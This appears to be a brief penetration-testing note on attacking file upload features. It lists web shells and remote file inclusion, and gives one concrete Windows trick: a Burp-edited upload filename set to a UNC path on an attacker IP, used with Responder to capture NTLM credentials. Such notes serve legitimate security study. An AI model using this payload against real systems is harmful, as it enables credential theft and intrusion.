
Try:
Shells (PHP, ASPX)
[[Uploading vulnerabilities]]
Remote file inclusion

#### Windows
SMB link: 
upload a file, then change the name in burpsuite to `Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.231\\test"` , with Responder running.

